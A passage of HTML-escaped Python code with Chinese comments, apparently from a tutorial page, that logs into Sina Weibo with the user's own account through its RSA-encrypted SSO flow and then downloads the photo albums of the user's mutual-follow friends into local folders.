;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.resultGet&nbsp;=&nbsp;{}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#文件夹名称\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.mkName&nbsp;=&nbsp;&quot;&quot;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#图片保存路径\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.PathImg&nbsp;=&nbsp;&quot;F:\\py\\oop6\\\\&quot;\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#登录用的post提交参数\r\n&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;postPage(self,url,data):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;headers&nbsp;=&nbsp;{&#39;User-Agent&#39;&nbsp;:&nbsp;&#39;Mozilla/5.0&nbsp;(compatible;&nbsp;MSIE&nbsp;9.0;&nbsp;Windows&nbsp;NT&nbsp;6.1;&nbsp;WOW64;&nbsp;Trident/5.0)&#39;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;parse.urlencode(data).encode(&#39;utf-8&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;requesturl&nbsp;=&nbsp;request.Request(url,data,headers)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response&nbsp;=&nbsp;self.opener.open(requesturl)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.cookie.save(ignore_discard=True,&nbsp;ignore_expires=True)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;response.read().decode(&#39;gbk&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;request.URLError&nbsp;as&nbsp;e:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;hasattr(e,&#39;reason&#39;):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;(u&quot;提交微博登录失败，错误原因：&quot;,e.reason)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#获取页面&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getPage(self,url,headers=&#39;&#39;):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;headers:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;requesturl&nbsp;=&nbsp;request.Request(url,headers&nbsp;=&nbsp;headers)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;requesturl&nbsp;=&nbsp;request.Request(url)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response&nbsp;=&nbsp;self.opener.open(requesturl)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;response.read().decode(&#39;utf-8&#39;,&#39;ignore&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;request.URLError&nbsp;as&nbsp;e:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;hasattr(e,&#39;reason&#39;):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;(u&quot;获取微博页面失败，错误原因：&quot;,e.reason)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#获取登录用参数，需要微博帐号\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getLoginGet(self,user):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;loginUrl&nbsp;=&nbsp;&#39;http://login.sina.com.cn/sso/prelogin.php?entry=weibo&amp;callback=sinaSSOController.preloginCallBack&amp;su=%s&amp;rsakt=mod&amp;checkpin=1&amp;client=ssologin.js(v1.4.15)&amp;_=1400822309846&#39;&nbsp;%&nbsp;user\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;loginPage&nbsp;=&nbsp;self.getPage(loginUrl)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern&nbsp;=&nbsp;re.compile(&#39;&quot;servertime&quot;:(.*?),&quot;.*?&quot;nonce&quot;:&quot;(.*?)&quot;,&quot;pubkey&quot;:&quot;(.*?)&quot;,&quot;rsakv&quot;:&quot;(.*?)&quot;,.*?exectime&#39;,re.S)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;resultPage&nbsp;=&nbsp;re.search(pattern,loginPage)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.resultGet[&#39;servertime&#39;]&nbsp;=&nbsp;resultPage.group(1)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.resultGet[&#39;nonce&#39;]&nbsp;=&nbsp;resultPage.group(2)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.resultGet[&#39;pubkey&#39;]&nbsp;=&nbsp;resultPage.group(3)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.resultGet[&#39;rsakv&#39;]&nbsp;=&nbsp;resultPage.group(4)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#user为帐号，pwd为密码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;loginWeibo(self,user,pwd):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#获取登录要用到的参数\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.getLoginGet(user)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#微博加密方法\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;su&nbsp;=&nbsp;base64.b64encode(bytes(request.quote(user)&nbsp;,&nbsp;encoding&nbsp;=&nbsp;&#39;utf-8&#39;))\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsaPublickey&nbsp;=&nbsp;int(self.resultGet[&#39;pubkey&#39;]&nbsp;,&nbsp;16)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;key&nbsp;=&nbsp;rsa.PublicKey(rsaPublickey&nbsp;,&nbsp;65537)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;message&nbsp;=&nbsp;bytes(str(self.resultGet[&#39;servertime&#39;])&nbsp;+&nbsp;&#39;\\t&#39;&nbsp;+&nbsp;str(self.resultGet[&#39;nonce&#39;])&nbsp;+&nbsp;&#39;\\n&#39;&nbsp;+&nbsp;str(pwd)&nbsp;,&nbsp;encoding&nbsp;=&nbsp;&#39;utf-8&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sp&nbsp;=&nbsp;binascii.b2a_hex(rsa.encrypt(message&nbsp;,&nbsp;key))\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#最后带过去的参数...\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;param&nbsp;=&nbsp;{&#39;entry&#39;&nbsp;:&nbsp;&#39;weibo&#39;&nbsp;,&nbsp;&#39;gateway&#39;&nbsp;:&nbsp;1&nbsp;,&nbsp;&#39;from&#39;&nbsp;:&nbsp;&#39;&#39;&nbsp;,&nbsp;&#39;savestate&#39;&nbsp;:&nbsp;7&nbsp;,&nbsp;&#39;useticket&#39;&nbsp;:&nbsp;1&nbsp;,&nbsp;&#39;pagerefer&#39;&nbsp;:&nbsp;&#39;http://login.sina.com.cn/sso/logout.php?entry=miniblog&amp;r=http%3A%2F%2Fweibo.com%2Flogout.php%3Fbackurl%3D&#39;&nbsp;,&nbsp;&#39;vsnf&#39;&nbsp;:&nbsp;1&nbsp;,&nbsp;&#39;su&#39;&nbsp;:&nbsp;su&nbsp;,&nbsp;&#39;service&#39;&nbsp;:&nbsp;&#39;miniblog&#39;&nbsp;,&nbsp;&#39;servertime&#39;&nbsp;:&nbsp;self.resultGet[&#39;servertime&#39;]&nbsp;,&nbsp;&#39;nonce&#39;&nbsp;:&nbsp;self.resultGet[&#39;nonce&#39;]&nbsp;,&nbsp;&#39;pwencode&#39;&nbsp;:&nbsp;&#39;rsa2&#39;&nbsp;,&nbsp;&#39;rsakv&#39;&nbsp;:&nbsp;self.resultGet[&#39;rsakv&#39;]&nbsp;,&nbsp;&#39;sp&#39;&nbsp;:&nbsp;sp&nbsp;,&nbsp;&#39;sr&#39;&nbsp;:&nbsp;&#39;1680*1050&#39;&nbsp;,&nbsp;&#39;encoding&#39;&nbsp;:&nbsp;&#39;UTF-8&#39;&nbsp;,&nbsp;&#39;prelt&#39;&nbsp;:&nbsp;961&nbsp;,&nbsp;&#39;url&#39;&nbsp;:&nbsp;&#39;http://weibo.com/ajaxlogin.php?framelogin=1&amp;callback=parent.sinaSSOController.feedBackUrlCallBack&#39;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#登录，这里得到的是登录跳转页面，需取出里面的登录链接\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;loginGo&nbsp;=&nbsp;self.postPage(&#39;http://login.sina.com.cn/sso/login.php?client=ssologin.js(v1.4.15)&#39;,param)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;urlPage&nbsp;=&nbsp;re.findall(&quot;location.replace\\(\\&#39;(.*?)\\&#39;\\);&quot;&nbsp;,&nbsp;loginGo)[0]\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#到这步才完成登录\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.getPage(urlPage)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#获取好友圈的全部url\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getPageFriends(self):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#获取自己的微博id\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pageU&nbsp;=&nbsp;self.getPage(&#39;http://account.weibo.com/set/index&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FindUid&nbsp;=&nbsp;re.findall(&#39;&lt;a&nbsp;target=.*?href=&quot;http://weibo.com/(.*?)/info&#39;,pageU)[0]\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#好友圈页面\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;page&nbsp;=&nbsp;self.getPage(&#39;http://weibo.com/&#39;+str(FindUid)+&#39;/relation/friends&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern&nbsp;=&nbsp;re.compile(&quot;&lt;a&nbsp;action-type=.*?href=(.*?)from=myfollow_friends.*?&gt;&lt;img&quot;,re.S)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;items&nbsp;=&nbsp;[&#39;http://weibo.com&#39;+self.ToolContent(item)&nbsp;for&nbsp;item&nbsp;in&nbsp;re.findall(pattern,page)]\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(u&quot;你的微博共有&quot;,len(items),u&quot;个互粉好友&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#items就是所有好友的微博首页链接\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;item&nbsp;in&nbsp;items:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.getOneFriend(item)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getOneFriend(self,url):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pageFriend&nbsp;=&nbsp;self.getPage(url)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.getMkName(pageFriend)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(u&quot;正在采集&quot;,self.mkName,u&quot;的照片...&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#这里就是获取page_id的地方\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern&nbsp;=&nbsp;re.compile(&quot;&lt;a&nbsp;&nbsp;bpfilter=.*?href=.*?p(.*?)/home&quot;,re.S)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;re.search(pattern,pageFriend)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;result.group(1):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(u&quot;纳尼（惊讶脸）&quot;,self.mkName,u&quot;的采集出错了，用getOneFriend重新采集吧&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;item&nbsp;=&nbsp;re.sub(&#39;/&#39;,&quot;&quot;,result.group(1))\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#为何要组成这个链接呢，看下图\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;photoUrl&nbsp;=&nbsp;&quot;http://photo.weibo.com/page/waterfall?ajwvr=6&amp;filter=wbphoto%7C%7C%7Cv6&amp;page=1&amp;count=20&amp;module_id=profile_photo&amp;oid=&quot;+self.ToolContent(item)+&quot;&amp;uid=&amp;lastMid=&amp;lang=zh-cn&amp;_t=1&amp;callback=STK_14574892696449&quot;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#这里就已经得到了一个页面的图片链接，下一步就可以直接保存这些图片了。\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.getWbimages(photoUrl)\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#获取昵称&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getMkName(self,page):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern&nbsp;=&nbsp;re.compile(&quot;&lt;title&gt;(.*?)&lt;/title&gt;&quot;,re.S)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;re.search(pattern,page)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.mkName&nbsp;=&nbsp;re.sub(&#39;的微博_微博&#39;,&quot;&quot;,result.group(1))&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;ToolContent(self,x):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x&nbsp;=&nbsp;re.sub(&#39;&quot;&#39;,&quot;&quot;,x)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x&nbsp;=&nbsp;re.sub(r&#39;\\\\&#39;,&quot;&quot;,x)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;x.strip()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;ToolImage(self,x):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x&nbsp;=&nbsp;re.sub(&#39;&quot;&#39;,&quot;&quot;,x)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x&nbsp;=&nbsp;re.sub(r&#39;\\\\&#39;,&quot;&quot;,x)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#这一步很重要，否则获取的只是小图片\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x&nbsp;=&nbsp;re.sub(&#39;cmw218&#39;,&quot;mw1024&quot;,x)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;x.strip()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;getWbimages(self,url):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;headers&nbsp;=&nbsp;{&#39;User-Agent&#39;&nbsp;:&nbsp;&#39;Mozilla/5.0&nbsp;(Windows&nbsp;NT&nbsp;5.1)&nbsp;AppleWebKit/537.36&nbsp;(KHTML,&nbsp;like&nbsp;Gecko)&nbsp;Chrome/45.0.2454.101&nbsp;Safari/537.36&#39;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pageImg&nbsp;=&nbsp;self.getPage(url,headers)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern&nbsp;=&nbsp;re.compile(&quot;&lt;img&nbsp;action-type.*?src=(.*?)/&gt;.*?img_intros&quot;,re.S)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;items&nbsp;=&nbsp;[self.ToolImage(item)&nbsp;for&nbsp;item&nbsp;in&nbsp;re.findall(pattern,pageImg)]\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.saveImags(items)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;saveImags(self,items):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(u&quot;发现&quot;,self.mkName,u&quot;的微博共有&quot;,len(items),u&quot;张照片&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.mkdirImg(self.mkName)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;k,imageUrl&nbsp;in&nbsp;enumerate(items):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;splitPath&nbsp;=&nbsp;imageUrl.split(&#39;.&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fTail&nbsp;=&nbsp;splitPath.pop()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(fTail)&nbsp;&gt;&nbsp;3:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fTail&nbsp;=&nbsp;&quot;jpg&quot;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fileName&nbsp;=&nbsp;self.mkName&nbsp;+&nbsp;&quot;/&quot;&nbsp;+&nbsp;str(k+1)&nbsp;+&nbsp;&quot;.&quot;&nbsp;+&nbsp;fTail\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.saveImg(imageUrl,fileName)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;saveImg(self,imgUrl,fileName):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filePath&nbsp;=&nbsp;self.PathImg&nbsp;+&nbsp;fileName\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;headers&nbsp;=&nbsp;{&#39;User-Agent&#39;&nbsp;:&nbsp;&#39;Mozilla/5.0&nbsp;(Windows&nbsp;NT&nbsp;5.1)&nbsp;AppleWebKit/537.36&nbsp;(KHTML,&nbsp;like&nbsp;Gecko)&nbsp;Chrome/45.0.2454.101&nbsp;Safari/537.36&#39;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;requesturl&nbsp;=&nbsp;request.Request(imgUrl,headers&nbsp;=&nbsp;headers)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;u&nbsp;=&nbsp;request.urlopen(requesturl)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;u.read()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f&nbsp;=&nbsp;open(filePath,&#39;wb&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(data)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(u&quot;正在保存一张图片&quot;,fileName)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.close()\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;mkdirImg(self,pathName):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;path&nbsp;=&nbsp;self.PathImg&nbsp;+&nbsp;pathName\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;isExists&nbsp;=&nbsp;os.path.exists(path)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;isExists:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(u&quot;正在创建名为&quot;,pathName,u&quot;的图集文件夹&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os.makedirs(path)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;True\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&